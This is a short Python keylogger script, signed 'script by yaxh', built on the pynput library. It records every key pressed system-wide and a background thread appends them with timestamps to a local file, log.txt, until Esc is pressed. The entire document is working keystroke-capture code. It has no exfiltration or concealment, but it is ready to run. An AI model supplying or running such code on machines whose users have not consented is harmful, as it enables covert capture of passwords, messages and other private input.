##script by yaxh!

from pynput import keyboard
import time
import threading
import os
import datetime

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.running = False
        self.file_name = 'log.txt'

    def start(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        self.running = False
        self.listener.stop()

    def on_press(self, key):
        if key == keyboard.Key.esc:
            self.stop()
        else:
            self.keys.append(key)

    def on_release(self, key):
        pass

    def write_keys(self):
        while self.running:
            if self.keys:
                with open(self.file_name, 'a') as f:
                    f.write(str(datetime.datetime.now()) + '\n')
                    for key in self.keys:
                        f.write(str(key) + '\n')
                self.keys = []

    def run(self):
        self.start()
        writer = threading.Thread(target=self.write_keys)
        writer.start()
        while self.running:
            time.sleep(1)

    def main(self):
        self.run()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.main()
